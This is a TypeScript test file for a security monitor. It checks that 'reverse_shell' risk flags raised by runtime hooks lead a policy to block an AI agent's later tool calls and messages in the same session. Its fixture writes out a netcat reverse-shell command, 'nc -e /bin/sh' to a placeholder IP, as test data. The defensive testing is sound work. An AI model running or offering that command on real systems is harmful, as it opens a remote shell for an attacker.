/**
 * 端到端：runtime hook 事件携带的 risk_flags 按会话沉淀后，
 * 回填进 tool_call / message_write 评估上下文的 ctx.riskFlags，让
 * riskFlagsAny/All 规则与 fail_open_high_risk_only 兜底也能拿到
 * 风险信号。
 *
 * 断言口径是落盘事件的 intervention 决策（行为级），不直接探测私有字段。
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { readFileSync, existsSync, appendFileSync, writeFileSync, mkdtempSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { SecurityMonitorStore } from './store.js';
import type { SecurityEvent } from './types.js';

function wait(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

async function waitForEvents(
  ndjsonPath: string,
  predicate: (events: SecurityEvent[]) => boolean,
  timeoutMs = 5000
): Promise<SecurityEvent[]> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (existsSync(ndjsonPath)) {
      const events = readFileSync(ndjsonPath, 'utf8')
        .split('\n')
        .filter((line) => line.trim())
        .map((line) => JSON.parse(line) as SecurityEvent);
      if (predicate(events)) return events;
    }
    await wait(100);
  }
  throw new Error('timed out waiting for events in ' + ndjsonPath);
}

describe('主进程评估入口回填会话 riskFlags', () => {
  let tmpDir: string;
  let runtimeLog: string;
  let ndjsonPath: string;
  let policyPath: string;
  let store: SecurityMonitorStore;

  beforeEach(async () => {
    tmpDir = mkdtempSync(join(tmpdir(), 'store-risk-flags-'));
    runtimeLog = join(tmpDir, 'security-events-runtime.jsonl');
    ndjsonPath = join(tmpDir, 'security-events.jsonl');
    policyPath = join(tmpDir, 'security-policy.spl.yaml');
    writeFileSync(runtimeLog, '', 'utf8');
    writeFileSync(
      policyPath,
      `apiVersion: security.use/v2
kind: Policy
metadata:
  id: risk-flag-test
  name: risk-flag-test
  version: 1.0.0
rules:
  - id: risk-flag-tool-call
    severity: medium
    priority: 100
    match:
      actionType: [agent_tool_call]
      riskFlagsAny: [reverse_shell]
    action:
      decision: block
      blockReason: 命中 runtime 风险标签，已阻断
      blockCode: RISK_FLAG_TOOLCALL_001
  - id: risk-flag-message
    severity: medium
    priority: 100
    match:
      actionType: [agent_message]
      riskFlagsAny: [reverse_shell]
    action:
      decision: block
      blockReason: 命中 runtime 风险标签，已阻断
      blockCode: RISK_FLAG_MESSAGE_001
`,
      'utf8'
    );

    store = new SecurityMonitorStore();
    await store.initialize({
      collector: { ndjsonPath },
      application: { enabled: true, runtimeHooks: { enabled: true, logPath: runtimeLog } },
      system: { enabled: false },
      network: { enabled: false },
      assetMonitor: { enabled: false },
      intervention: {
        enabled: true,
        mode: 'audit',
        policyPath,
        reloadIntervalMs: 0,
      },
    });
  });

  afterEach(async () => {
    await store.shutdown();
  });

  function appendRuntimeProcessEvent(sessionId: string, riskFlags: string[]) {
    appendFileSync(
      runtimeLog,
      JSON.stringify({
        event_type: 'process_start',
        type: 'application.process_start',
        timestamp: new Date().toISOString(),
        runtime: 'node',
        api: 'child_process.exec',
        executable: 'nc',
        process_name: 'nc',
        pid: 4321,
        ppid: 1,
        command_line: 'nc -e /bin/sh 203.0.113.10 4444',
        session_id: sessionId,
        risk_flags: riskFlags,
      }) + '\n',
      'utf8'
    );
  }

  it('runtime 风险标签回填 tool_call 上下文：riskFlagsAny 规则命中并阻断', async () => {
    appendRuntimeProcessEvent('sess-risk', ['reverse_shell']);
    // 等 runtime 事件被采集评估（回填完成）后再发 tool_call。
    await waitForEvents(
      ndjsonPath,
      (list) => list.some((e) => e.event_type === 'process_start' && e.session_id === 'sess-risk')
    );

    await store.beforeToolCall({
      sessionKey: 'sess-risk',
      runId: 'run-1',
      agentId: 'agent-1',
      toolName: 'Bash',
      params: { command: 'ls' },
    });

    const events = await waitForEvents(
      ndjsonPath,
      (list) => list.some((e) => e.event_type === 'agent_tool_call' && e.session_id === 'sess-risk')
    );
    const evt = events.find((e) => e.event_type === 'agent_tool_call' && e.session_id === 'sess-risk')!;
    expect(evt.intervention?.decision).toBe('block');
    expect(evt.intervention?.block_code).toBe('RISK_FLAG_TOOLCALL_001');
  });

  it('runtime 风险标签回填 message_write 上下文：riskFlagsAny 规则命中并阻断', async () => {
    appendRuntimeProcessEvent('sess-msg-risk', ['reverse_shell']);
    await waitForEvents(
      ndjsonPath,
      (list) => list.some((e) => e.event_type === 'process_start' && e.session_id === 'sess-msg-risk')
    );

    await store.beforeMessageWrite({
      sessionKey: 'sess-msg-risk',
      runId: 'run-1',
      role: 'user',
      content: 'hello',
    });

    const events = await waitForEvents(
      ndjsonPath,
      (list) => list.some((e) => e.event_type === 'agent_message' && e.session_id === 'sess-msg-risk')
    );
    const evt = events.find((e) => e.event_type === 'agent_message' && e.session_id === 'sess-msg-risk')!;
    expect(evt.intervention?.decision).toBe('block');
    expect(evt.intervention?.block_code).toBe('RISK_FLAG_MESSAGE_001');
  });

  it('无 runtime 风险标签的会话不受影响（行为与旧版一致）', async () => {
    await store.beforeToolCall({
      sessionKey: 'sess-clean',
      runId: 'run-2',
      agentId: 'agent-1',
      toolName: 'Bash',
      params: { command: 'ls' },
    });

    const events = await waitForEvents(
      ndjsonPath,
      (list) => list.some((e) => e.event_type === 'agent_tool_call' && e.session_id === 'sess-clean')
    );
    const evt = events.find((e) => e.event_type === 'agent_tool_call' && e.session_id === 'sess-clean')!;
    // 无风险标签 → 规则不命中 → 放行（intervention 标注为 allow）。
    expect(evt.intervention?.decision).toBe('allow');
  });
});
